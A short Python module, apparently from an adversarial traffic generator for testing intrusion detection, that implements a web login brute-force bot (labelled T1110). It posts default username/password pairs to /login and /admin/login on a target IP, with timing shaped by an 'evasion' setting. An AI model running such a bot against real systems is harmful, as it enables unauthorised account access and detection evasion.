import time

from src.adversarial.bots.base import get_timing, http_request

CLASS_ID = "T1110_web_bruteforce"


def run(target_ip: str, evasion: str) -> int:
    creds = [("admin", "admin"), ("root", "password"), ("user", "123456")]
    flows = 0
    for user, pwd in creds:
        body = f"username={user}&password={pwd}".encode()
        flows += http_request(
            target_ip, 80, "POST", "/login",
            evasion, headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=body,
        )
        flows += http_request(
            target_ip, 80, "POST", "/admin/login",
            evasion, headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=body,
        )
        time.sleep(get_timing(evasion))
    return flows
